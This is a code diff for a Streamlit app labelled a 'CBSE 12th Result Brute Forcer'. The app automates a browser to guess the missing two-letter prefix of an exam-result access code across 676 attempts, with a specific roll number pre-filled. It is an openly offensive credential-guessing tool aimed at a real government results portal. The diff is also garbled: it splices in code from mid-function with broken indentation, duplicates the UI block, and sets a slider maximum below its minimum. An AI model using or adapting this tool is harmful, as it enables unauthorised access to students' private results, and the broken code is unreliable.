@@ -88,6 +88,42 @@ st.title("🔍 CBSE 12th Result Brute Forcer")
 
 roll_number = st.text_input("Roll Number", value="18615900")
 known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
+delay = st.slider("Delay between attempts (seconds)", 1.5, 5.0, 2.5)
+
+if st.button("🚀 Start Brute Force", type="primary"):
+    if len(known_last_6) != 6:
+        st.error("Last 6 characters must be exactly 6.")
+    elif not roll_number:
+        st.error("Please enter Roll Number.")
+    else:
+        run_brute_force(roll_number.strip(), known_last_6.strip().upper(), delay)
+                    if is_success(driver):
+                        result.success(f"""
+                        🎉 **SUCCESS FOUND!**
+
+                        **Full Code:** `{code}`
+                        **Prefix:** `{a}{b}`
+                        """)
+                        st.balloons()
+                        return
+                except:
+                    continue
+
+        st.error("❌ Finished all 676 attempts. Code not found.")
+
+    except Exception as e:
+        st.error(f"**Browser Error:** {e}")
+    finally:
+        if driver:
+            driver.quit()
+
+
+# ====================== MAIN UI ======================
+st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
+st.title("🔍 CBSE 12th Result Brute Forcer")
+
+roll_number = st.text_input("Roll Number", value="18615900")
+known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
 delay = st.slider("Delay between attempts (seconds)", 1.5, 0.5, 2.5)
 
 if st.button("🚀 Start Brute Force", type="primary"):
